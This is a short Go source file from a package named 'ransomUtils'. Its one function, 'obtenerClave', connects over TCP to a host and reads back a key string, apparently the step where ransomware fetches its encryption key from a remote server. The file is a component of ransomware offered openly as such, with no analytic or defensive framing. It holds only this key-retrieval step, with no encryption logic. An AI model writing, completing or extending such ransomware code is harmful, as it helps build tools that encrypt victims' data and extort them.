package ransomUtils

import (
	"bufio"
	"net"
	"strings"
)

func obtenerClave(host string) (string, error) {
	const protocol = "tcp"
	con, err := net.Dial(protocol, host)
	if err != nil {
		return "", err
	}
	re := bufio.NewReader(con)
	palabra, err := re.ReadString('\n')
	if err != nil {
		return "", err
	}
	key := strings.TrimSpace(palabra)
	return key, nil
}
